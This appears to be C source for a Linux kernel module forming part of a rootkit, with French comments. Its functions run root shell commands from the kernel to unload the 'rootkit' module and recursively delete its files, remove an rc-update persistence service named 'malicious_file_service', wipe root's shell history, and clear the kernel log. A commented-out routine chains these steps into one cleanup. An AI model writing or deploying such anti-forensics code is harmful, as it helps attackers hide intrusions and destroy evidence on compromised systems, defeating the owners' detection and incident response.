#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kallsyms.h>
#include <linux/fs_struct.h>
#include <linux/slab.h>


void kboom(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "/sbin/rmmod rootkit && /bin/rm -rf /module/", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);

}

//- Supprimer persistence rc-update et /etc/init.d script

void kboom_persistence(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "rc-update del malicious_file_service && /bin/rm /etc/init.d/malicious_file_service", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}

//- Effacer history 

void flush_history(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "cat /dev/null > /root/.ash_history ", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}


//- Effacer log (dmesg, syslog, /log/messages)

void flush_dmesg(void){
    char *cmd_argv[] = { "/bin/bash", "-c", "dmesg --clear", NULL };
    char *cmd_envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    call_usermodehelper(cmd_argv[0], cmd_argv, cmd_envp, UMH_WAIT_EXEC);
}

// int one_thread_to_destruct_all(void *func){
//     kboom_persistence();
//     kboom();
//     flush_history();
//     flush_dmesg();

//     return 0;
// }



//EXPORT_SYMBOL(my_work);